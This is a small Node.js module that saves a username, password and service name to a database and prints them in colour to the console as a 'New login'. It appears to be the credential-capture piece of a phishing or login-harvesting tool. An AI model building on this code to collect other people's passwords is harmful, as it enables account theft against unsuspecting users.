const chalk = require('chalk');

const index = require('../index');
const driver = require('./driver');

exports.saveNewLogin = function (serviceName, username, password) {
    if (index.usingDatabase) {
        let newLogin = new driver.getModals().Creds({
            username: username,
            password: password,
            service: serviceName
        });
        newLogin.save();
    }
    console.info(`${chalk.green(`[!${chalk.red('|')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
};